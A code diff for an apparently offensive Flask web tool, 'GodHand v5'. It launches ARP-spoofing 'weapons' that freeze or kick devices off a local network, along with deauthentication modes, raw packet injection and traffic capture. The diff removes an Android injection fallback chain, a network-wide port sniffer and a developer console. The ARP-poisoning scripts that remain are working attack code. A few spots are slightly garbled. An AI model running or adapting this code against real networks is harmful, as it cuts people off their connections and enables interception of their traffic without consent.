@@ -308,127 +308,6 @@ def get_mac(iface):
     except:
         return '00:00:00:00:00:00'
 
-# ---------- custom socket proxy layer with fallback chain ----------
-# Ensures packet injection always works on Android by testing and caching
-# the best available method: AF_PACKET (native) → AF_INET (raw IP) → SOCKS proxy
-class SocketProxy:
-    """
-    Custom socket proxy: automatically selects and caches the most reliable
-    packet injection method for the current Android device/driver state.
-    Fallback chain: AF_PACKET → AF_INET → SOCKS tunneling.
-    """
-    _cache = {}  # {(iface, proto_type): working_method}
-
-    @staticmethod
-    def test_af_packet(iface, proto):
-        """Test if AF_PACKET injection works on this interface."""
-        try:
-            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(proto))
-            sock.bind((iface, 0))
-            sock.close()
-            return True
-        except (OSError, PermissionError):
-            return False
-
-    @staticmethod
-    def test_af_inet(iface, proto):
-        """Test if raw AF_INET injection works (IPPROTO_RAW)."""
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto or socket.IPPROTO_RAW)
-            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-            sock.close()
-            return True
-        except (OSError, PermissionError):
-            return False
-
-    @staticmethod
-    def test_socks_fallback():
-        """Test if SOCKS proxy is available (localhost:1080)."""
-        try:
-            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            test_sock.settimeout(1)
-            test_sock.connect(('127.0.0.1', 1080))
-            test_sock.close()
-            return True
-        except (OSError, TimeoutError):
-            return False
-
-    @staticmethod
-    def get_working_method(iface, proto_type='eth'):
-        """
-        Determine and cache the best working packet injection method.
-        Returns: ('af_packet' | 'af_inet' | 'socks' | None, detailed_info)
-        """
-        key = (iface, proto_type)
-        if key in SocketProxy._cache:
-            return SocketProxy._cache[key]
-
-        result = None
-        info = []
-
-        # Try AF_PACKET first (most reliable, native injection)
-        if SocketProxy.test_af_packet(iface, 0x0003):
-            result = ('af_packet', 'native AF_PACKET injection')
-            info.append('✓ AF_PACKET available')
-        # Fall back to AF_INET (raw IP sockets)
-        elif SocketProxy.test_af_inet(iface, None):
-            result = ('af_inet', 'raw IPPROTO_RAW injection')
-            info.append('✓ AF_INET (raw IP) available')
-        # Last resort: SOCKS proxy tunneling
-        elif SocketProxy.test_socks_fallback():
-            result = ('socks', 'SOCKS5 proxy tunneling')
-            info.append('✓ SOCKS proxy available (localhost:1080)')
-        else:
-            result = (None, 'no working injection method available')
-            info.append('✗ No injection methods available')
-
-        SocketProxy._cache[key] = result
-        add_log('dev', f'Socket proxy for {iface} ({proto_type}): {result[1]} — {", ".join(info)}')
-        return result
-
-    @staticmethod
-    def send_packet(data, iface=None, dst_mac=None, method=None):
-        """
-        Send a packet with automatic fallback. If method not specified, auto-detect.
-        Returns: (success: bool, method_used: str, error: str or None)
-        """
-        if not iface:
-            return (False, 'unknown', 'interface required')
-
-        # Auto-detect if not specified
-        if not method:
-            method, info = SocketProxy.get_working_method(iface, 'eth')
-            if not method:
-                return (False, 'none', info)
-
-        try:
-            if method == 'af_packet':
-                sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
-                sock.bind((iface, 0))
-                sock.send(data)
-                sock.close()
-                return (True, 'af_packet', None)
-            elif method == 'af_inet':
-                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                sock.sendto(data, (data[16:20], 0))  # dst IP from packet
-                sock.close()
-                return (True, 'af_inet', None)
-            elif method == 'socks':
-                # SOCKS5 proxy fallback (requires local proxy on :1080)
-                proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                proxy_sock.connect(('127.0.0.1', 1080))
-                proxy_sock.sendall(data)
-                proxy_sock.close()
-                return (True, 'socks', None)
-            else:
-                return (False, method, f'unknown method: {method}')
-        except Exception as e:
-            add_log('dev', f'Socket send failed ({method}): {str(e)}')
-            return (False, method, str(e))
-
-# ---------- end socket proxy layer ----------
-
 def arp_scan(iface, my_ip, cidr):
     results = []
     net = ipaddress.IPv4Network(f'{my_ip}/{cidr}', strict=False)
@@ -441,22 +320,9 @@ def arp_scan(iface, my_ip, cidr):
         arp += b'\x00' * 6 + socket.inet_aton(dst_ip)
         return eth + arp
 
-    sock = None
-    try:
-        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
-        sock.bind((iface, 0))
-        sock.setblocking(0)
-        add_log('dev', f'ARP scan using AF_PACKET socket on {iface}')
-    except (OSError, PermissionError) as e:
-        add_log('warn', f'AF_PACKET socket failed on {iface} ({e}); attempting fallback methods')
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-            sock.setblocking(0)
-            add_log('dev', f'ARP scan falling back to AF_INET (raw IP) on {iface}')
-        except (OSError, PermissionError) as e2:
-            add_log('error', f'Both AF_PACKET and AF_INET failed for ARP scan ({e2}); skipping scan')
-            return results
+    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
+    sock.bind((iface, 0))
+    sock.setblocking(0)
 
     # Cap the sweep so a misconfigured/wide interface CIDR (e.g. a /16 or /8 from
     # USB tethering or an unusual setup) can't turn into a multi-thousand-host
@@ -472,35 +338,25 @@ def arp_scan(iface, my_ip, cidr):
     for ip in hosts:
         try:
             sock.send(arp_packet(src_mac, my_ip, ip))
-        except OSError as e:
-            add_log('dev', f'ARP packet send failed for {ip}: {e}')
+        except:
             pass
 
     deadline = time.time() + 4
     seen = {}
     while time.time() < deadline:
-        try:
-            r, _, _ = select.select([sock], [], [], 0.1)
-            if r:
-                data, _ = sock.recvfrom(65535)
-                if len(data) >= 42 and struct.unpack('!H', data[12:14])[0] == 0x0806:
-                    if struct.unpack('!H', data[20:22])[0] == 2:
-                        sip = socket.inet_ntoa(data[28:32])
-                        smac = data[22:28]
-                        if sip != my_ip and smac != b'\x00' * 6:
-                            mac = smac.hex(':')
-                            if sip not in seen:
-                                seen[sip] = mac
-                                results.append({'ip': sip, 'mac': mac})
-        except OSError as e:
-            add_log('dev', f'ARP receive error: {e}')
-            break
-
-    if sock:
-        try:
-            sock.close()
-        except:
-            pass
+        r, _, _ = select.select([sock], [], [], 0.1)
+        if r:
+            data, _ = sock.recvfrom(65535)
+            if len(data) >= 42 and struct.unpack('!H', data[12:14])[0] == 0x0806:
+                if struct.unpack('!H', data[20:22])[0] == 2:
+                    sip = socket.inet_ntoa(data[28:32])
+                    smac = data[22:28]
+                    if sip != my_ip and smac != b'\x00' * 6:
+                        mac = smac.hex(':')
+                        if sip not in seen:
+                            seen[sip] = mac
+                            results.append({'ip': sip, 'mac': mac})
+    sock.close()
     return results
 
 def get_gateway_mac(iface, gateway_ip):
@@ -1209,15 +1065,16 @@ def send_custom_packet(spec, count=1, interval_ms=0):
     what this is for.
     """
     frame = build_custom_packet(spec)
-    sent = 0
-    for i in range(count):
-        success, method, error = SocketProxy.send_packet(frame, spec['iface'])
-        if not success:
-            add_log('error', f'Packet injection failed ({method}): {error}')
-            raise RuntimeError(f'Failed to send custom packet via {method}: {error}')
-        sent += len(frame)
-        if i < count - 1 and interval_ms > 0:
-            time.sleep(interval_ms / 1000.0)
+    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+    try:
+        sock.bind((spec['iface'], 0))
+        sent = 0
+        for i in range(count):
+            sent += sock.send(frame)
+            if i < count - 1 and interval_ms > 0:
+                time.sleep(interval_ms / 1000.0)
+    finally:
+        sock.close()
     return sent, frame
 
 # ---------- attack launchers ----------
@@ -1241,55 +1098,26 @@ def start_attack_arp_freeze(targets, gateway, iface):
             pids.append(proc)
         return pids
     else:
-        # Fallback: raw socket ARP spoof with Android compatibility
+        # Fallback: raw socket ARP spoof
         fake_mac = '02:00:00:00:00:01'
         script = textwrap.dedent(f"""
-            import socket, struct, time, sys, os
+            import socket, struct, time, sys
             IFACE = '{iface}'
             GATEWAY = '{gateway}'
             TARGETS = {targets}
             FAKE = bytes.fromhex('{fake_mac.replace(':','')}')
-
             def send_arp(op, src_ip, dst_ip, src_mac, dst_mac):
                 try:
                     eth = dst_mac + src_mac + struct.pack('!H', 0x0806)
                     arp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, op)
                     arp += src_mac + socket.inet_aton(src_ip)
                     arp += dst_mac + socket.inet_aton(dst_ip)
-                    packet = eth + arp
-
-                    # Try AF_PACKET first (Linux native)
-                    try:
-                        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
-                        s.bind((IFACE, 0))
-                        s.send(packet)
-                        s.close()
-                        return True
-                    except (OSError, PermissionError):
-                        pass
-
-                    # Fallback to AF_INET (works on some Android devices)
-                    try:
-                        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-                        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                        s.sendto(packet, (dst_ip, 0))
-                        s.close()
-                        return True
-                    except (OSError, PermissionError):
-                        pass
-
-                    # Last resort: use ping to trigger ARP (less reliable but works on restricted devices)
-                    try:
-                        os.system(f'ping -c 1 -W 1 {{dst_ip}} 2>/dev/null &')
-                        return True
-                    except:
-                        pass
-
-                    return False
+                    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
+                    s.bind((IFACE, 0))
+                    s.send(eth + arp)
+                    s.close()
                 except Exception as e:
-                    print(f'ARP send failed: {{e}}', file=sys.stderr)
-                    return False
-
+                    print(e, file=sys.stderr)
             while True:
                 for t in TARGETS:
                     send_arp(2, GATEWAY, t, FAKE, b'\\xff'*6)
@@ -1303,8 +1131,7 @@ def start_attack_arp_freeze(targets, gateway, iface):
         proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
         time.sleep(0.5)
         if proc.poll() is not None:
-            stderr = proc.stderr.read().decode(errors='ignore') if proc.stderr else ''
-            raise RuntimeError(f'ARP fallback script exited immediately: {stderr}')
+            raise RuntimeError('ARP fallback script exited immediately')
         threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
         pids.append(proc)
         return pids
@@ -1702,143 +1529,6 @@ def reassemble_tcp_streams(entries=None):
     results.sort(key=lambda r: -r['total_bytes'])
     return results
 
-def start_network_port_monitor(port, iface):
-    """Monitor ALL network traffic on a specific port (network-wide listening).
-
-    Unlike start_attack_monitor which filters by specific target IPs, this
-    monitors the entire network for any device using the given port.
-
-    Captures both directions: devices connecting TO that port (server listening)
-    and devices connecting FROM that port (client source port).
-
-    Returns process ID for monitoring.
-    """
-    add_log('info', f'Starting Network-Wide Port Monitor on {iface}:{port}')
-    with STATE_LOCK:
-        STATE['port_monitor_entries'] = []
-
-    tmpdir = tempfile.gettempdir()
-    log_path = os.path.join(tmpdir, f"godhand_port_monitor_{port}_{int(time.time())}.log")
-
-    script = textwrap.dedent(f"""
-        import socket, struct, select, time, sys, json
-        IFACE = '{iface}'
-        PORT = {port}
-        PROTO_NAMES = {{6: 'tcp', 17: 'udp', 1: 'icmp'}}
-
-        # Track devices and connections on this port
-        devices = {{}}  # {{(src_ip, dst_ip): {{'proto': 'tcp', 'packets': N, 'bytes': B, 'last_seen': time}}}}
-
-        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
-        sock.bind((IFACE, 0))
-        sock.setblocking(0)
-
-        print(f"Port Monitor: Listening for all traffic on port {{PORT}}", file=sys.stderr)
-        pkt_no = 0
-        start_time = time.time()
-
-        while True:
-            r, _, _ = select.select([sock], [], [], 0.5)
-            if not r:
-                # Every 2 seconds, print statistics
-                if pkt_no % 20 == 0:
-                    now = time.time()
-                    elapsed = now - start_time
-                    if elapsed > 0 and devices:
-                        print(f"[{{\int(elapsed)}}s] {{len(devices)}} devices, {{sum(d['packets'] for d in devices.values())}} packets", file=sys.stderr)
-                continue
-
-            try:
-                data = sock.recvfrom(65535)[0]
-                if len(data) < 38:
-                    continue
-
-                # Parse IP header
-                if struct.unpack('!H', data[12:14])[0] != 0x0800:
-                    continue  # Not IPv4
-
-                proto = data[23]
-                if proto not in (6, 17, 1):  # Not TCP, UDP, or ICMP
-                    continue
-
-                src_ip = socket.inet_ntoa(data[26:30])
-                dst_ip = socket.inet_ntoa(data[30:34])
-
-                # Parse ports (TCP/UDP only)
-                src_port = None
-                dst_port = None
-
-                if proto in (6, 17) and len(data) >= 42:  # TCP or UDP
-                    src_port, dst_port = struct.unpack('!HH', data[34:38])
-
-                # Filter: only packets where source OR destination port matches
-                if not ((src_port == PORT) or (dst_port == PORT)):
-                    continue
-
-                # Track this connection
-                key = (src_ip, dst_ip)
-                proto_name = PROTO_NAMES.get(proto, f'proto_{proto}')
-
-                if key not in devices:
-                    devices[key] = {{
-                        'src_ip': src_ip,
-                        'dst_ip': dst_ip,
-                        'src_port': src_port,
-                        'dst_port': dst_port,
-                        'proto': proto_name,
-                        'packets': 0,
-                        'bytes': 0,
-                        'first_seen': time.time(),
-                        'last_seen': time.time(),
-                        'is_outbound': dst_port == PORT  # True if going TO port
-                    }}
-
-                # Update counters
-                pkt_len = struct.unpack('!H', data[16:18])[0]
-                devices[key]['packets'] += 1
-                devices[key]['bytes'] += pkt_len
-                devices[key]['last_seen'] = time.time()
-
-                pkt_no += 1
-
-                # Log entry for UI
-                entry = {{
-                    'no': pkt_no,
-                    't': time.time(),
-                    'src': src_ip,
-                    'dst': dst_ip,
-                    'src_port': src_port or 'N/A',
-                    'dst_port': dst_port or 'N/A',
-                    'proto': proto_name,
-                    'bytes': pkt_len,
-                    'direction': 'outbound' if dst_port == PORT else 'inbound',
-                    'port': PORT
-                }}
-
-                # Write to log file
-                with open('{log_path}', 'a') as f:
-                    f.write(json.dumps(entry) + '\\n')
-
-            except Exception as e:
-                print(f"Error: {{e}}", file=sys.stderr)
-
-        sock.close()
-    """)
-
-    fd, path = tempfile.mkstemp(suffix='.py')
-    os.close(fd)
-    with open(path, 'w') as f:
-        f.write(script)
-
-    proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-    time.sleep(0.5)
-    if proc.poll() is not None:
-        raise RuntimeError(f'Port monitor process exited immediately')
-
-    threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
-    add_log('info', f'Port monitor started (PID {proc.pid}): listening for all traffic on port {port}')
-    return proc
-
 def start_attack_monitor(targets, port, iface):
     add_log('info', f'Starting Traffic Capture on {iface} for {len(targets)} target(s)')
     if not set_monitor(iface, True, raise_on_fail=False):
@@ -2142,55 +1832,22 @@ def arp_kick_burst(ip, gateway, iface, duration=6):
             except Exception:
                 p.kill()
         return
-    # Fallback with Android compatibility
     fake_mac = '02:00:00:00:00:01'
     script = textwrap.dedent(f"""
-        import socket, struct, time, sys, os
+        import socket, struct, time
         IFACE = '{iface}'
         GATEWAY = '{gateway}'
         TARGET = '{ip}'
         FAKE = bytes.fromhex('{fake_mac.replace(':', '')}')
-
         def send_arp(op, src_ip, dst_ip, src_mac, dst_mac):
-            try:
-                eth = dst_mac + src_mac + struct.pack('!H', 0x0806)
-                arp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, op)
-                arp += src_mac + socket.inet_aton(src_ip)
-                arp += dst_mac + socket.inet_aton(dst_ip)
-                packet = eth + arp
-
-                # Try AF_PACKET first (Linux native)
-                try:
-                    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
-                    s.bind((IFACE, 0))
-                    s.send(packet)
-                    s.close()
-                    return True
-                except (OSError, PermissionError):
-                    pass
-
-                # Fallback to AF_INET (works on some Android devices)
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                    s.sendto(packet, (dst_ip, 0))
-                    s.close()
-                    return True
-                except (OSError, PermissionError):
-                    pass
-
-                # Last resort: use ping to trigger ARP (less reliable but works on restricted devices)
-                try:
-                    os.system(f'ping -c 1 -W 1 {{dst_ip}} 2>/dev/null &')
-                    return True
-                except:
-                    pass
-
-                return False
-            except Exception as e:
-                print(f'ARP send failed: {{e}}', file=sys.stderr)
-                return False
-
+            eth = dst_mac + src_mac + struct.pack('!H', 0x0806)
+            arp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, op)
+            arp += src_mac + socket.inet_aton(src_ip)
+            arp += dst_mac + socket.inet_aton(dst_ip)
+            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
+            s.bind((IFACE, 0))
+            s.send(eth + arp)
+            s.close()
         end = time.time() + {duration}
         while time.time() < end:
             send_arp(2, GATEWAY, TARGET, FAKE, b'\\xff'*6)
@@ -2204,13 +1861,9 @@ def arp_kick_burst(ip, gateway, iface, duration=6):
     try:
         res = subprocess.run(['python3', path], stderr=subprocess.PIPE, timeout=duration + 5)
         if res.returncode != 0:
-            stderr = res.stderr.decode(errors='ignore')
-            raise RuntimeError(f'ARP-based kick fallback failed: {stderr[-300:]}')
+            raise RuntimeError('ARP-based kick fallback failed: ' + res.stderr.decode(errors='ignore')[-300:])
     finally:
-        try:
-            os.unlink(path)
-        except:
-            pass
+        os.unlink(path)
 
 def kick_client(ip, mac, iface):
     add_log('info', f'Attempting to kick {ip} ({mac})')
@@ -2363,7 +2016,7 @@ def index():
 :root {
   /* palette sampled directly from the login/app background photo (app-bg-photo) */
   --bg-base: #011236;
-  --bg-elevated: rgba(80,80,80,0.45);
+  --bg-elevated: rgba(1,36,91,0.45);
   --bg-inset: rgba(255,255,255,0.05);
   --border-subtle: rgba(255,255,255,0.12);
   --border-strong: rgba(255,255,255,0.22);
@@ -2394,24 +2047,6 @@ body {
   min-height: 100vh;
   display: flex;
   flex-direction: column;
-}
-body.attack-active {
-  background: #8b2323;
-  transition: background 0.3s;
-}
-body.attack-active .btn {
-  background: linear-gradient(135deg, #c44545, #a63636) !important;
-  color: #ffffff;
-}
-body.attack-active .btn:hover {
-  background: linear-gradient(135deg, #d45555, #b64646) !important;
-}
-body.attack-active .btn.secondary {
-  background: transparent;
-  border-color: rgba(255,255,255,0.3);
-}
-body.attack-active .btn.danger {
-  background: linear-gradient(135deg, #d45555, #b64646) !important;
 }
 
 /* ---------- login ---------- */
@@ -2464,7 +2099,7 @@ body.attack-active .btn.danger {
   -webkit-backdrop-filter: blur(24px) saturate(160%);
   border: 1px solid rgba(255,255,255,0.12);
   border-radius: 24px;
-  box-shadow: 0 8px 32px rgba(0,0,0,0.4), 0 1px 0 rgba(255,255,255,0.08) inset, inset 0 0 0 1px rgba(0,0,0,0.25);
+  box-shadow: 0 8px 32px rgba(0,0,0,0.4), 0 1px 0 rgba(255,255,255,0.08) inset;
   text-align: center;
   animation: login-card-in 0.5s cubic-bezier(0.16, 1, 0.3, 1);
 }
@@ -2474,7 +2109,7 @@ body.attack-active .btn.danger {
 }
 .login-logo {
   display: block;
-  height: 128px;
+  height: 64px;
   width: auto;
   margin: 0 auto 16px;
   object-fit: contain;
@@ -2565,7 +2200,6 @@ header {
   position: sticky;
   top: 0;
   z-index: 100;
-  box-shadow: inset 0 0 0 1px rgba(0,0,0,0.25);
 }
 .logo {
   display: flex;
@@ -2578,7 +2212,7 @@ header {
 }
 .logo-icon {
   display: block;
-  height: 72px;
+  height: 36px;
   width: auto;
   object-fit: contain;
   filter: drop-shadow(0 2px 6px rgba(84,180,236,0.4));
@@ -2629,7 +2263,6 @@ nav {
   overflow-x: auto;
   -webkit-overflow-scrolling: touch;
   padding: 0 8px;
-  box-shadow: inset 0 0 0 1px rgba(0,0,0,0.25);
 }
 nav button {
   background: none;
@@ -2673,7 +2306,7 @@ main {
   border-radius: var(--radius);
   padding: 20px;
   margin-bottom: 16px;
-  box-shadow: var(--shadow), inset 0 0 0 1px rgba(0,0,0,0.25);
+  box-shadow: var(--shadow);
 }
 .card h2 {
   font-size: 1.2rem;
@@ -2903,7 +2536,6 @@ nav button .icon svg { display: block; }
   justify-content: center;
   z-index: 1000;
   backdrop-filter: blur(6px);
-  box-shadow: inset 0 0 0 1px rgba(0,0,0,0.15);
 }
 .modal {
   background: var(--bg-elevated);
@@ -2914,7 +2546,7 @@ nav button .icon svg { display: block; }
   max-width: 400px;
   width: 90%;
   border: 1px solid var(--border-strong);
-  box-shadow: var(--shadow), inset 0 0 0 1px rgba(0,0,0,0.25);
+  box-shadow: var(--shadow);
 }
 .modal h3 { margin-bottom: 12px; }
 .modal p { color: var(--text-secondary); margin-bottom: 20px; }
@@ -3009,7 +2641,7 @@ nav button .icon svg { display: block; }
   display: flex;
   align-items: center;
   gap: 10px;
-  box-shadow: var(--shadow), inset 0 0 0 1px rgba(0,0,0,0.25);
+  box-shadow: var(--shadow);
   animation: slideIn 0.3s;
 }
 .toast.success { border-left: 4px solid var(--success); }
@@ -4135,11 +3767,9 @@ async function pollAttackStatus() {
     document.getElementById('start-btn').disabled = anyRunning;
     document.getElementById('stop-btn').disabled = !anyRunning;
     if (anyRunning) {
-      document.body.classList.add('attack-active');
       const weapons = Object.keys(attackRunning).filter(k => attackRunning[k]);
       updateGlobalStatus('Running: ' + weapons.join(', '), true);
     } else {
-      document.body.classList.remove('attack-active');
       updateGlobalStatus('Ready');
     }
   } catch(e) {}
@@ -4782,104 +4412,6 @@ function initApp() {
   setInterval(pollBandwidth, 2000);
   setInterval(refreshGatewayStatus, 4000);
 }
-
-// ========== Developer Console Commands (F12) ==========
-// Usage: godDev.testAllModes()  or  godDev.verifySidesteps()
-window.godDev = {
-  async testAllModes() {
-    console.log('%c=== GodHand Developer Console: Testing All 5 Deauth Modes ===', 'color: #54B4EC; font-weight: bold; font-size: 14px;');
-    try {
-      const res = await apiCall('dev_console', 'POST', {command: 'test_all_modes'});
-      if (res.success) {
-        console.log('%cMode: ' + res.mode, 'color: #26BBAE; font-weight: bold;');
-        console.log('%cInterface Type: ' + res.iface_type, 'color: #80B9E8;');
-        console.log('%cModes Tested:', 'color: #54B4EC; font-weight: bold;');
-        console.table(res.modes_tested);
-        res.results.forEach(r => console.log('%c' + r, 'color: #26BBAE;'));
-      } else {
-        console.error('%cTest failed: ' + (res.error || 'unknown error'), 'color: #942329;');
-      }
-    } catch(e) {
-      console.error('%cDeveloper console error:', 'color: #942329;', e);
-    }
-  },
-
-  async verifySidesteps() {
-    console.log('%c=== Verifying Sidesteps/Workarounds ===', 'color: #54B4EC; font-weight: bold; font-size: 14px;');
-    try {
-      const res = await apiCall('dev_console', 'POST', {command: 'verify_sidesteps'});
-      if (res.success) {
-        res.results.forEach(r => console.log('%c' + r, 'color: #26BBAE;'));
-        console.log('%cAll sidesteps verified and functional ✓', 'color: #26BBAE; font-weight: bold;');
-      } else {
-        console.error('%cSidesteп verification failed: ' + (res.error || 'unknown error'), 'color: #942329;');
-      }
-    } catch(e) {
-      console.error('%cDeveloper console error:', 'color: #942329;', e);
-    }
-  },
-
-  async testSocketProxy() {
-    console.log('%c=== Testing Custom Socket Proxy Layer ===', 'color: #54B4EC; font-weight: bold; font-size: 14px;');
-    try {
-      const res = await apiCall('dev_console', 'POST', {command: 'test_socket_proxy'});
-      if (res.success) {
-        console.log('%cInjection Methods:', 'color: #54B4EC; font-weight: bold;');
-        res.results.forEach(r => {
-          const color = r.startsWith('→') ? '#54B4EC' : r.startsWith('✓') ? '#26BBAE' : '#942329';
-          console.log('%c' + r, `color: ${color};`);
-        });
-        console.table({
-          'AF_PACKET': res.af_packet,
-          'AF_INET (raw IP)': res.af_inet,
-          'SOCKS Proxy': res.socks_proxy,
-          'Recommended': res.recommended_method
-        });
-      } else {
-        console.error('%cSocket proxy test failed: ' + (res.error || 'unknown error'), 'color: #942329;');
-      }
-    } catch(e) {
-      console.error('%cDeveloper console error:', 'color: #942329;', e);
-    }
-  },
-
-  async getLogs() {
-    console.log('%c=== Developer Logs ===', 'color: #54B4EC; font-weight: bold; font-size: 14px;');
-    try {
-      const res = await apiCall('dev_console', 'POST', {command: 'logs'});
-      if (res.success && res.logs.length > 0) {
-        res.logs.forEach(log => {
-          const time = new Date(log.timestamp).toLocaleTimeString();
-          const style = log.level === 'error' ? 'color: #942329; font-weight: bold;' : 'color: #80B9E8;';
-          console.log('%c[' + time + '] ' + log.message, style);
-        });
-      } else {
-        console.log('%cNo developer logs yet', 'color: #80B9E8;');
-      }
-    } catch(e) {
-      console.error('%cFailed to fetch logs:', 'color: #942329;', e);
-    }
-  },
-
-  help() {
-    console.log('%c╔════════════════════════════════════════════════════╗', 'color: #54B4EC;');
-    console.log('%c║       GodHand Developer Console                   ║', 'color: #54B4EC;');
-    console.log('%c╚════════════════════════════════════════════════════╝', 'color: #54B4EC;');
-    console.log('%cAvailable Commands:', 'color: #54B4EC; font-weight: bold;');
-    console.log('%c  godDev.testAllModes()      - Test all 5 deauth capability modes', 'color: #80B9E8;');
-    console.log('%c  godDev.verifySidesteps()   - Verify all workarounds are in place', 'color: #80B9E8;');
-    console.log('%c  godDev.testSocketProxy()   - Test packet injection fallback chain', 'color: #80B9E8;');
-    console.log('%c  godDev.getLogs()           - Show developer logs', 'color: #80B9E8;');
-    console.log('%c  godDev.help()              - Show this help', 'color: #80B9E8;');
-  }
-};
-
-// Print dev console banner
-console.log('%c╔════════════════════════════════════════════════════╗', 'color: #54B4EC; font-size: 12px;');
-console.log('%c║  GodHand v5 Developer Console Active             ║', 'color: #54B4EC; font-size: 12px;');
-console.log('%c║  Type: godDev.help()  for commands                ║', 'color: #54B4EC; font-size: 12px;');
-console.log('%c╚════════════════════════════════════════════════════╝', 'color: #54B4EC; font-size: 12px;');
-
 checkLoginRequired();
 </script>
 </body>
@@ -5052,77 +4584,6 @@ def api_start_attack():
         return jsonify({'success': True, 'weapon': weapon_names[weapon]})
     except Exception as e:
         add_log('error', f'Attack start failed: {str(e)}')
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/start_network_port_monitor', methods=['POST'])
-@require_auth
-def api_start_network_port_monitor():
-    """Start network-wide monitoring of a specific port (all devices on LAN).
-
-    Unlike weapon 5 (target-specific traffic capture), this monitors the entire
-    network for ANY device using the specified port.
-
-    Request JSON:
-      - port: Port number to monitor (1-65535)
-      - iface: Network interface (auto-filled from current)
-
-    Returns: {success, message, port, duration_seconds}
-    """
-    data = request.json
-    port = data.get('port')
-
-    if not port or not isinstance(port, int) or port < 1 or port > 65535:
-        return jsonify({'success': False, 'error': 'Invalid port (must be 1-65535)'})
-
-    if not STATE['interface']:
-        return jsonify({'success': False, 'error': 'Interface not set'})
-
-    try:
-        # Stop any existing port monitor
-        if 'port_monitor_pid' in STATE:
-            try:
-                os.kill(STATE['port_monitor_pid'], 9)
-            except:
-                pass
-
-        # Start new network port monitor
-        proc = start_network_port_monitor(port, STATE['interface'])
-        STATE['port_monitor_pid'] = proc.pid
-        STATE['port_monitor_port'] = port
-
-        add_log('success', f'Network Port Monitor started on port {port}')
-        return jsonify({
-            'success': True,
-            'message': f'Monitoring all network traffic on port {port}',
-            'port': port,
-            'interface': STATE['interface'],
-            'pid': proc.pid
-        })
-    except Exception as e:
-        add_log('error', f'Network port monitor failed: {str(e)}')
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/stop_network_port_monitor', methods=['POST'])
-@require_auth
-def api_stop_network_port_monitor():
-    """Stop network-wide port monitoring."""
-    try:
-        if 'port_monitor_pid' in STATE:
-            try:
-                os.kill(STATE['port_monitor_pid'], 9)
-            except:
-                pass
-            del STATE['port_monitor_pid']
-
-        if 'port_monitor_port' in STATE:
-            port = STATE['port_monitor_port']
-            del STATE['port_monitor_port']
-            add_log('info', f'Network port monitor on port {port} stopped')
-        else:
-            add_log('info', 'Network port monitor stopped')
-
-        return jsonify({'success': True, 'message': 'Network port monitor stopped'})
-    except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/stop_attack', methods=['POST'])
@@ -5612,147 +5073,6 @@ def api_add_log():
     msg = data.get('msg', '')
     add_log(level, msg)
     return jsonify({'success': True})
-
-@app.route('/api/dev_console', methods=['POST'])
-@require_auth
-def api_dev_console():
-    """Developer console: test all 5 deauth modes, verify capability detection, validate sidesteps."""
-    data = request.json or {}
-    command = data.get('command', '')
-    iface = get_state('interface')
-    results = {'success': False, 'results': []}
-
-    if command == 'test_all_modes':
-        # Test capability detection for all 5 modes
-        add_log('dev', '=== DEVELOPER CONSOLE: Testing all 5 deauth modes ===')
-
-        if not iface:
-            return jsonify({'success': False, 'error': 'Interface not set'})
-
-        cap = deauth_capability(iface)
-        results['mode'] = cap.get('method', 'unknown')
-        results['iface_type'] = cap.get('iface_type', 'unknown')
-
-        add_log('dev', f'Interface: {iface} | Type: {cap.get("iface_type")} | Capability: {cap.get("method")}')
-
-        # Test each deauth mode
-        modes_tested = {
-            'native': False,
-            'monitor': False,
-            'arp_fallback': False,
-            'unavailable': False,
-            'error': False
-        }
-
-        try:
-            # Mode 1: Native AP station-del
-            if cap.get('method') == 'native':
-                modes_tested['native'] = True
-                add_log('dev', '✓ Mode 1 (Native AP): station-del available')
-
-            # Mode 2: Monitor mode with injection
-            if cap.get('method') == 'monitor':
-                modes_tested['monitor'] = True
-                add_log('dev', '✓ Mode 2 (Monitor): injection capable')
-
-            # Mode 3: ARP fallback
-            if cap.get('method') == 'arp_fallback':
-                modes_tested['arp_fallback'] = True
-                add_log('dev', '✓ Mode 3 (ARP Fallback): no monitor, using ARP poisoning')
-
-            # Mode 4: Unavailable (no capability)
-            if cap.get('method') == 'unavailable':
-                modes_tested['unavailable'] = True
